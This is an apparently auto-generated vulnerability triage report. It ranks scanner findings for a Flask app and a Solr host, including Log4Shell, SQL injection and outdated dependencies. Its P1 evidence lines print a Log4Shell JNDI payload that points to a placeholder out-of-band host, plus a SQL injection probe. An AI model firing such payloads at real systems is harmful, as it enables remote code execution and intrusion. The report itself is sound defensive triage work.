# Vulnerability triage report

Generated 2026-10-27. **65** raw findings became **32** unique issues (51% less noise).

| Priority | Fix within | Count |
|---|---|---|
| P1 | 7 days | 2 |
| P2 | 30 days | 9 |
| P3 | 90 days | 20 |
| P4 | backlog | 1 |

## Findings

| # | Priority | Due | Issue | Location | CVSS | EPSS | KEV | Found by | Why this priority |
|---|---|---|---|---|---|---|---|---|---|
| 1 | **P1** | 2026-11-03 | Apache Log4j2 Remote Code Injection (Log4Shell) | `http://10.10.0.15:8983/solr/admin/cores?action` | 10.0 | 100.0% | ⚠️ yes | nuclei | listed in CISA KEV: exploited in the wild |
| 2 | **P1** | 2026-11-03 | Error Based SQL Injection | `http://127.0.0.1:5000/notes/unsafe?q` | 9.0 | – |  | zap+nuclei | critical (scanner rating, no CVSS available) |
| 3 | **P2** | 2026-11-26 | Vulnerable dependency requests 2.19.1 (CVE-2018-18074) | `requests==2.19.1` | 7.5 | 6.9% |  | pip-audit | high (CVSS 7.5) |
| 4 | **P2** | 2026-11-26 | Vulnerable dependency jinja2 2.10 (CVE-2019-10906) | `jinja2==2.10` | 8.6 | 3.5% |  | pip-audit | high (CVSS 8.6) |
| 5 | **P2** | 2026-11-26 | Vulnerable dependency urllib3 1.23 (CVE-2026-21441) | `urllib3==1.23` | 7.5 | 2.9% |  | pip-audit | high (CVSS 7.5) |
| 6 | **P2** | 2026-11-26 | Vulnerable dependency urllib3 1.23 (CVE-2019-11324) | `urllib3==1.23` | 7.5 | 2.9% |  | pip-audit | high (CVSS 7.5) |
| 7 | **P2** | 2026-11-26 | Vulnerable dependency idna 2.7 (CVE-2024-3651) | `idna==2.7` | 7.5 | 1.4% |  | pip-audit | high (CVSS 7.5) |
| 8 | **P2** | 2026-11-26 | Vulnerable dependency urllib3 1.23 (CVE-2023-43804) | `urllib3==1.23` | 8.1 | 1.4% |  | pip-audit | high (CVSS 8.1) |
| 9 | **P2** | 2026-11-26 | Vulnerable dependency jinja2 2.10 (CVE-2024-56326) | `jinja2==2.10` | 7.8 | 0.5% |  | pip-audit | high (CVSS 7.8) |
| 10 | **P2** | 2026-11-26 | Generic API Key detected | `app/app.py:89` | 7.5 | – |  | semgrep | high (scanner rating, no CVSS available) |
| 11 | **P2** | 2026-11-26 | Detected user input used to manually construct a SQL string. This could lead to SQL injection. | `app/app.py:98` | 7.5 | – |  | semgrep | high (scanner rating, no CVSS available) |
| 12 | **P3** | 2027-01-25 | Vulnerable dependency jinja2 2.10 (CVE-2020-28493) | `jinja2==2.10` | 5.3 | 3.6% |  | pip-audit | medium (CVSS 5.3) |
| 13 | **P3** | 2027-01-25 | Vulnerable dependency requests 2.19.1 (CVE-2023-32681) | `requests==2.19.1` | 6.1 | 3.0% |  | pip-audit | medium (CVSS 6.1) |
| 14 | **P3** | 2027-01-25 | Vulnerable dependency urllib3 1.23 (CVE-2020-26137) | `urllib3==1.23` | 6.5 | 2.3% |  | pip-audit | medium (CVSS 6.5) |
| 15 | **P3** | 2027-01-25 | Vulnerable dependency urllib3 1.23 (CVE-2019-11236) | `urllib3==1.23` | 6.1 | 2.1% |  | pip-audit | medium (CVSS 6.1) |
| 16 | **P3** | 2027-01-25 | Vulnerable dependency urllib3 1.23 (CVE-2024-37891) | `urllib3==1.23` | 4.4 | 1.1% |  | pip-audit | medium (CVSS 4.4) |
| 17 | **P3** | 2027-01-25 | Vulnerable dependency requests 2.19.1 (CVE-2024-47081) | `requests==2.19.1` | 5.3 | 1.0% |  | pip-audit | medium (CVSS 5.3) |
| 18 | **P3** | 2027-01-25 | Vulnerable dependency jinja2 2.10 (CVE-2024-34064) | `jinja2==2.10` | 5.4 | 1.0% |  | pip-audit | medium (CVSS 5.4) |
| 19 | **P3** | 2027-01-25 | Vulnerable dependency jinja2 2.10 (CVE-2024-22195) | `jinja2==2.10` | 5.4 | 0.9% |  | pip-audit | medium (CVSS 5.4) |
| 20 | **P3** | 2027-01-25 | Vulnerable dependency urllib3 1.23 (CVE-2025-66471) | `urllib3==1.23` | 5.0 | 0.7% |  | pip-audit | medium (scanner rating, no CVSS available) |
| 21 | **P3** | 2027-01-25 | Vulnerable dependency urllib3 1.23 (CVE-2018-25091) | `urllib3==1.23` | 6.1 | 0.6% |  | pip-audit | medium (CVSS 6.1) |
| 22 | **P3** | 2027-01-25 | Vulnerable dependency urllib3 1.23 (CVE-2023-45803) | `urllib3==1.23` | 4.2 | 0.6% |  | pip-audit | medium (CVSS 4.2) |
| 23 | **P3** | 2027-01-25 | Vulnerable dependency jinja2 2.10 (CVE-2025-27516) | `jinja2==2.10` | 5.0 | 0.5% |  | pip-audit | medium (scanner rating, no CVSS available) |
| 24 | **P3** | 2027-01-25 | Vulnerable dependency urllib3 1.23 (CVE-2025-50181) | `urllib3==1.23` | 5.3 | 0.5% |  | pip-audit | medium (CVSS 5.3) |
| 25 | **P3** | 2027-01-25 | Vulnerable dependency idna 2.7 (CVE-2026-45409) | `idna==2.7` | 5.3 | 0.4% |  | pip-audit | medium (CVSS 5.3) |
| 26 | **P3** | 2027-01-25 | Vulnerable dependency requests 2.19.1 (CVE-2024-35195) | `requests==2.19.1` | 5.6 | 0.3% |  | pip-audit | medium (CVSS 5.6) |
| 27 | **P3** | 2027-01-25 | Vulnerable dependency urllib3 1.23 (CVE-2026-97689) | `urllib3==1.23` | 5.0 | 0.3% |  | pip-audit | medium (scanner rating, no CVSS available) |
| 28 | **P3** | 2027-01-25 | Vulnerable dependency urllib3 1.23 (CVE-2026-44431) | `urllib3==1.23` | 5.3 | 0.3% |  | pip-audit | medium (CVSS 5.3) |
| 29 | **P3** | 2027-01-25 | Vulnerable dependency requests 2.19.1 (CVE-2026-25645) | `requests==2.19.1` | 5.5 | 0.2% |  | pip-audit | medium (CVSS 5.5) |
| 30 | **P3** | 2027-01-25 | Detected Flask app with debug=True. Do not deploy to production with this flag enabled. | `app/admin.py:41` | 5.0 | – |  | semgrep | medium (scanner rating, no CVSS available) |
| 31 | **P3** | 2027-01-25 | Content Security Policy (CSP) Header Not Set | `http://127.0.0.1:5000` | 5.0 | – |  | zap+nuclei | medium (scanner rating, no CVSS available) |
| 32 | **P4** | backlog | Server Leaks Version Information via "Server" HTTP Response Header Field | `http://127.0.0.1:5000` | 3.0 | – |  | zap | low (scanner rating, no CVSS available) |

## P1 and P2 details

### P1: Apache Log4j2 Remote Code Injection (Log4Shell)

- **Location:** `http://10.10.0.15:8983/solr/admin/cores?action`
- **Weakness:** CWE-502
- **CVEs:** CVE-2021-44228
- **CVSS vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`
- **Merged:** 1 duplicate report(s) from nuclei
- **Evidence:** `http://10.10.0.15:8983/solr/admin/cores?action=${jndi:ldap://oast}`
- **Fix:** Upgrade Log4j to 2.17.1 or later.

### P1: Error Based SQL Injection

- **Location:** `http://127.0.0.1:5000/notes/unsafe?q`
- **Weakness:** CWE-89
- **Merged:** 2 duplicate report(s) from zap, nuclei
- **Evidence:** `http://127.0.0.1:5000/notes/unsafe?q=%27`
- **Fix:** Use parameterized queries. Never build SQL from user input.

### P2: Vulnerable dependency requests 2.19.1 (CVE-2018-18074)

- **Location:** `requests==2.19.1`
- **CVEs:** CVE-2018-18074
- **CVSS vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`
- **Merged:** 1 duplicate report(s) from pip-audit
- **Evidence:** `The Requests package before 2.20.0 for Python sends an HTTP Authorization header to an http URI upon receiving a same-hostname https-to-http redirect, which makes it easier for remote attackers to dis`
- **Fix:** Upgrade to 2.20.0 or later

### P2: Vulnerable dependency jinja2 2.10 (CVE-2019-10906)

- **Location:** `jinja2==2.10`
- **CVEs:** CVE-2019-10906
- **CVSS vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N`
- **Merged:** 1 duplicate report(s) from pip-audit
- **Evidence:** `In Pallets Jinja before 2.10.1, str.format_map allows a sandbox escape.`
- **Fix:** Upgrade to 2.10.1 or later

### P2: Vulnerable dependency urllib3 1.23 (CVE-2026-21441)

- **Location:** `urllib3==1.23`
- **CVEs:** CVE-2026-21441
- **CVSS vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`
- **Merged:** 1 duplicate report(s) from pip-audit
- **Evidence:** `### Impact urllib3's [streaming API](https://urllib3.readthedocs.io/en/2.6.2/advanced-usage.html#streaming-and-i-o) is designed for the efficient handling of large HTTP responses by reading the conten`
- **Fix:** Upgrade to 2.6.3 or later

### P2: Vulnerable dependency urllib3 1.23 (CVE-2019-11324)

- **Location:** `urllib3==1.23`
- **CVEs:** CVE-2019-11324
- **CVSS vector:** `CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N`
- **Merged:** 1 duplicate report(s) from pip-audit
- **Evidence:** `The urllib3 library before 1.24.2 for Python mishandles certain cases where the desired set of CA certificates is different from the OS store of CA certificates, which results in SSL connections succe`
- **Fix:** Upgrade to 1.24.2 or later

### P2: Vulnerable dependency idna 2.7 (CVE-2024-3651)

- **Location:** `idna==2.7`
- **CVEs:** CVE-2024-3651
- **CVSS vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`
- **Merged:** 1 duplicate report(s) from pip-audit
- **Evidence:** `### Impact A specially crafted argument to the `idna.encode()` function could consume significant resources. This may lead to a denial-of-service. ### Patches The function has been refined to reject s`
- **Fix:** Upgrade to 3.7 or later

### P2: Vulnerable dependency urllib3 1.23 (CVE-2023-43804)

- **Location:** `urllib3==1.23`
- **CVEs:** CVE-2023-43804
- **CVSS vector:** `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N`
- **Merged:** 1 duplicate report(s) from pip-audit
- **Evidence:** `urllib3 doesn't treat the `Cookie` HTTP header special or provide any helpers for managing cookies over HTTP, that is the responsibility of the user. However, it is possible for a user to specify a `C`
- **Fix:** Upgrade to 1.26.17 or later

### P2: Vulnerable dependency jinja2 2.10 (CVE-2024-56326)

- **Location:** `jinja2==2.10`
- **CVEs:** CVE-2024-56326
- **CVSS vector:** `CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`
- **Merged:** 1 duplicate report(s) from pip-audit
- **Evidence:** `An oversight in how the Jinja sandboxed environment detects calls to `str.format` allows an attacker that controls the content of a template to execute arbitrary Python code. To exploit the vulnerabil`
- **Fix:** Upgrade to 3.1.5 or later

### P2: Generic API Key detected

- **Location:** `app/app.py:89`
- **Weakness:** CWE-798
- **Evidence:** `PAYMENTS_API_KEY = "<redacted>"`

### P2: Detected user input used to manually construct a SQL string. This could lead to SQL injection.

- **Location:** `app/app.py:98`
- **Weakness:** CWE-89
- **Merged:** 1 duplicate report(s) from semgrep
- **Evidence:** `rows = get_db().execute(sql).fetchall()`
